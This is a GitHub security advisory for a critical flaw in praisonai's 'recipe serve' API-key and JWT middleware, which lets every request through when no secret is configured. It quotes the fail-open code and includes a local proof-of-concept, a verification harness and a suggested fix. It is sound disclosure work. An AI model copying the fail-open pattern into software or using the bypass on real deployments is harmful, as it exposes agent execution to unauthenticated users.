# [C] praisonai: recipe serve auth middleware silently disables itself when no secret is set

## Summary
Severity: Critical
Advisory: GHSA-j4hj-7hfh-g2f4
CVE: CVE-2026-57127
CWE: CWE-1188, CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-j4hj-7hfh-g2f4
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.6.59

## Details
# praisonai: `recipe serve` authentication middleware silently disables itself when no secret is set

**Researcher:** Kai Aizen — SnailSploit (@SnailSploit), Adversarial & Offensive Security Research
**Target:** https://github.com/MervinPraison/PraisonAI

---

**Package:** `praisonai` on PyPI
**Version tested:** 4.6.48.
**File:** `praisonai/recipe/serve.py` (sha256 `491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23`).

---

## TL;DR

`praisonai/recipe/serve.py:312-410` defines two auth middlewares (`APIKeyAuthMiddleware`, `JWTAuthMiddleware`). Both contain the same "fail open when the secret is unset" branch at the top of their `dispatch`:

```python
async def dispatch(self, request, call_next):
    if request.url.path == "/health":
        return await call_next(request)
    expected_key = api_key or os.environ.get("PRAISONAI_API_KEY")
    if not expected_key:
        # No key configured, allow request
        return await call_next(request)
    ...
```

```python
async def dispatch(self, request, call_next):
    if request.url.path == "/health":
        return await call_next(request)
    secret = jwt_secret or os.environ.get("PRAISONAI_JWT_SECRET")
    if not secret:
        return await call_next(request)
    ...
```

The realistic mis-deploy:

1. operator sets `auth: api-key` (or `auth: jwt`) in their recipe YAML, expecting that line alone to enable auth,
2. operator does not set the corresponding `api_key:` / `jwt_secret:` value in the same YAML, AND
3. operator does not export `PRAISONAI_API_KEY` / `PRAISONAI_JWT_SECRET` in the environment.

The middleware silently treats every request as authenticated and forwards it to the recipe-execution route.

Combined with the praisonai jobs API having zero auth (a separate finding), operators who paid attention to "I have to set `auth: api-key` to lock this down" still don't get auth on the recipe-serve surface unless they also remember the secret.

## Root cause

```
   Expected behavior, after setting `auth: api-key` in the recipe YAML:
     "Now my recipe endpoints require an X-API-Key header."

   Actual behavior (serve.py:325-333):
     - middleware reads `expected_key = api_key or
       os.environ.get("PRAISONAI_API_KEY")`
     - if `expected_key` is None (neither YAML nor env supplied
       one), middleware logs nothing and forwards the request.
     - operator's recipe routes accept the request as if it were
       authenticated.  request.state.user is unset.

   Impact:
     The middleware's documented job is "validate the API key
     against the configured value".  The configured-value-is-None
     case is exactly the case the middleware should fail closed
     on — operator has signalled they want auth.  Failing open
     silently turns a documented authentication into a runtime
     no-op.
```

## Empirical verification

`poc/poc.py`:

1. Imports the installed praisonai 4.6.48 `praisonai.recipe.serve` module (sha256 `491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23`).
2. Clears `PRAISONAI_API_KEY` / `PRAISONAI_JWT_SECRET` env vars to simulate the mis-deploy.
3. Calls `serve.create_auth_middleware('api-key', api_key=None, jwt_secret=None)` and instantiates the returned middleware.
4. Builds a Starlette `Request` for `/runs` (the recipe-execution path) with empty headers — no `X-API-Key`, no `Authorization`.
5. `await middleware.dispatch(request, fake_call_next)` returns the sentinel `'REACHED-DOWNSTREAM (path=/runs)'` from the fake `call_next` — proving the middleware passed the request through without authenticating.
6. Repeats the test for `auth_type='jwt'` — same bypass on the JWT path.

Run log (`poc/run-log.txt`) summary:

```
[2] auth_type='api-key', no api_key / no PRAISONAI_API_KEY env
    middleware.dispatch -> 'REACHED-DOWNSTREAM (path=/runs)'
[3] auth_type='jwt', no jwt_secret / no PRAISONAI_JWT_SECRET env
    middleware.dispatch -> 'REACHED-DOWNSTREAM (path=/runs)'
    APIKeyAuthMiddleware allowed the request through without an API key.
    JWTAuthMiddleware allowed the request through without a Bearer token.
[4] grep '# No key configured, allow request' -> line 333

VERDICT: VULNERABLE
EXIT 0
```

## Impact

The recipe-serve surface runs agentic workflows — same execution posture as `praisonai/jobs/server.py` but separately configured / separately reached. Unauth access on this surface yields:

- Trigger arbitrary recipe executions, passing attacker-controlled inputs and configurations.
- Read the inputs / outputs of in-flight recipes — the operator's prompts and the LLM responses.
- In some deployments, the recipe execution surface is wired to tools (browser automation, file-system writes, code execution). Reaching those tools without auth is a direct RCE path.


## Anchors

- `praisonai/recipe/serve.py:325-333` — `APIKeyAuthMiddleware.dispatch` silent-bypass branch.
- `praisonai/recipe/serve.py:352-355` — `JWTAuthMiddleware.dispatch` silent-bypass branch.
- `praisonai/recipe/serve.py:688-694` — call site:
  ```python
  auth_type = config.get("auth")
  if auth_type and auth_type != "none":
      auth_middleware = create_auth_middleware(
          auth_type,
          api_key=config.get("api_key"),
          jwt_secret=config.get("jwt_secret"),
      )
  ```

## Suggested fix

When the operator has signalled "I want auth", refuse to start without the corresponding secret rather than silently degrading:

```python
def create_auth_middleware(auth_type, api_key=None, jwt_secret=None):
    if auth_type == 'api-key':
        expected_key = api_key or os.environ.get("PRAISONAI_API_KEY")
        if not expected_key:
            raise SystemExit(
                "auth_type='api-key' requested but no API key is "
                "configured.  Either set `api_key:` in your recipe "
                "YAML or export PRAISONAI_API_KEY.  Refusing to "
                "start with a silently disabled auth middleware."
            )
        ...
    elif auth_type == 'jwt':
        secret = jwt_secret or os.environ.get("PRAISONAI_JWT_SECRET")
        if not secret:
            raise SystemExit(
                "auth_type='jwt' requested but no JWT secret is "
                "configured.  Either set `jwt_secret:` in your recipe "
                "YAML or export PRAISONAI_JWT_SECRET.  Refusing to "
                "start with a silently disabled auth middleware."
            )
        ...
```

This is the same pattern the sibling `praisonai.gateway` server applies in `assert_external_bind_safe` at `praisonai/gateway/auth.py:48-54` — refuse-to-start on external bind without an auth token. The recipe-serve surface should do the same.

## Steps to reproduce

1. Clone the target: `git clone --depth 1 https://github.com/MervinPraison/PraisonAI`
2. Run the proof of concept (`poc.py`) against the cloned source.
3. Observe the result shown under *Verified result* below.

## Proof of concept

`poc.py`

```python
"""
PoC: praisonai 4.6.48 `praisonai recipe serve` configures
authentication via a `auth:` field in the recipe YAML.  Setting
`auth: api-key` or `auth: jwt` installs APIKeyAuthMiddleware or
JWTAuthMiddleware on the FastAPI app — and the operator's expectation
is that those endpoints now require a valid API key / Bearer JWT.

In reality, both middlewares contain an early-return that silently
bypasses authentication when the corresponding secret has not been
configured (neither via the recipe YAML nor via the
PRAISONAI_API_KEY / PRAISONAI_JWT_SECRET env var).
"""

import hashlib
import inspect
import os
import sys

def main() -> int:
    print('=' * 72)
    print('praisonai 4.6.48 — recipe serve auth middleware silent bypass')
    print('=' * 72)

    # Realistic deploy: operator sets `auth: api-key` in YAML but
    # forgets to set api_key / env var.
    for env_var in ('PRAISONAI_API_KEY', 'PRAISONAI_JWT_SECRET'):
        if env_var in os.environ:
            del os.environ[env_var]

    from praisonai.recipe import serve as serve_mod

    src = inspect.getsourcefile(serve_mod)
    with open(src, 'rb') as f:
        raw = f.read()
    sha = hashlib.sha256(raw).hexdigest()

    print()
    print(f'[1] serve.py path : {src}')
    print(f'    sha256        : {sha}')

    from starlette.requests import Request
    create_auth_middleware = serve_mod.create_auth_middleware

    async def fake_call_next(request):
        return f"REACHED-DOWNSTREAM (path={request.url.path})"

    async def driver(auth_type: str, headers=None):
        scope = {
            'type': 'http', 'method': 'GET', 'path': '/runs',
            'headers': headers or [], 'query_string': b'', 'scheme': 'http',
            'server': ('127.0.0.1', 8000), 'app': None, 'root_path': '',
        }
        request = Request(scope, receive=lambda: None)
        mw_cls = create_auth_middleware(auth_type, api_key=None, jwt_secret=None)
        if mw_cls is None:
            return 'middleware-import-failed'
        instance = mw_cls(app=None)
        return await instance.dispatch(request, fake_call_next)

    import asyncio

    print()
    print("[2] auth_type='api-key', no api_key / no PRAISONAI_API_KEY env")
    result_apikey = asyncio.run(driver('api-key'))
    print(f"    middleware.dispatch -> {result_apikey!r}")

    print()
    print("[3] auth_type='jwt', no jwt_secret / no PRAISONAI_JWT_SECRET env")
    result_jwt = asyncio.run(driver('jwt'))
    print(f"    middleware.dispatch -> {result_jwt!r}")

    vulnerable = False
    if isinstance(result_apikey, str) and 'REACHED-DOWNSTREAM' in result_apikey:
        vulnerable = True
        print('    APIKeyAuthMiddleware allowed the request through without an API key.')
    if isinstance(result_jwt, str) and 'REACHED-DOWNSTREAM' in result_jwt:
        vulnerable = True
        print('    JWTAuthMiddleware allowed the request through without a Bearer token.')

    # Static check that the bypass is on the code path.
    text = raw.decode('utf-8', errors='replace')
    needle_api = '# No key configured, allow request'
    apikey_line = next(
        (i for i, l in enumerate(text.splitlines(), 1) if needle_api in l),
        None,
    )
    print()
    print('[4] static cross-check — bypass branch on the code path')
    print(f"    grep '{needle_api}' -> line {apikey_line}")

    if not vulnerable:
        print('UNEXPECTED — the dispatch did not return the bypass result.')
        return 1

    print()
    print('VULNERABLE: praisonai 4.6.48 `recipe serve` AuthMiddleware classes')
    print('            both silently bypass auth when the operator sets auth_type')
    print('            but forgets the corresponding secret — unauthenticated access')
    print('            to recipe execution endpoints.')
    print('VERDICT: VULNERABLE')
    return 0

if __name__ == '__main__':
    sys.exit(main())
```

## Verification harness (executed against the cloned repo)

This drives the unmodified upstream code rather than a reproduction.

```python
import sys, types, os, importlib.util
BK=os.path.abspath("repos/PraisonAI/src/praisonai"); sys.path.insert(0,BK)
for p in ["praisonai","praisonai.recipe"]:
    m=types.ModuleType(p); m.__path__=[BK+"/"+p.replace(".","/")]; sys.modules[p]=m
spec=importlib.util.spec_from_file_location("praisonai.recipe.serve", BK+"/praisonai/recipe/serve.py")
serve=importlib.util.module_from_spec(spec); serve.__package__="praisonai.recipe"; sys.modules[spec.name]=serve; spec.loader.exec_module(serve)
print("[*] Loaded REAL praisonai recipe/serve.py")
os.environ.pop("PRAISONAI_API_KEY", None)   # operator forgot to export it too

from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import PlainTextResponse
from starlette.testclient import TestClient
def make_app(mw):
    app=Starlette(routes=[Route("/run", lambda r: PlainTextResponse("AGENT EXECUTED"), methods=["POST"])])
    app.add_middleware(mw); return TestClient(app)

# (A) operator set `auth: api-key` but forgot api_key + env -> REAL factory returns middleware that SILENTLY bypasses
MW_bypass = serve.create_auth_middleware("api-key", api_key=None)        # REAL factory
r = make_app(MW_bypass).post("/run")
print(f"[+] auth='api-key', NO key configured, NO header -> HTTP {r.status_code} body={r.text!r}")

# (B) control: same middleware WITH a key configured -> unauthenticated request is correctly 401
MW_enforced = serve.create_auth_middleware("api-key", api_key="real-secret")
r2 = make_app(MW_enforced).post("/run")
print(f"[*] auth='api-key', key CONFIGURED, NO header  -> HTTP {r2.status_code} (correctly rejected)")

assert r.status_code==200 and "AGENT EXECUTED" in r.text and r2.status_code==401
print("[+] CONFIRMED against real praisonai repo: APIKeyAuthMiddleware silently bypasses auth when no key configured -> agent route reachable unauthenticated")
```

## Verified result

This PoC was executed against the live upstream code; captured output:

```
[*] Loaded REAL praisonai recipe/serve.py
[+] auth='api-key', NO key configured, NO header -> HTTP 200 body='AGENT EXECUTED'
[*] auth='api-key', key CONFIGURED, NO header  -> HTTP 401 (correctly rejected)
[+] CONFIRMED against real praisonai repo: APIKeyAuthMiddleware silently bypasses auth when no key configured -> agent route reachable unauthenticated
```

## Credit

Kai Aizen — SnailSploit (@SnailSploit). Adversarial & Offensive Security Research.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-j4hj-7hfh-g2f4
- https://github.com/MervinPraison/PraisonAI
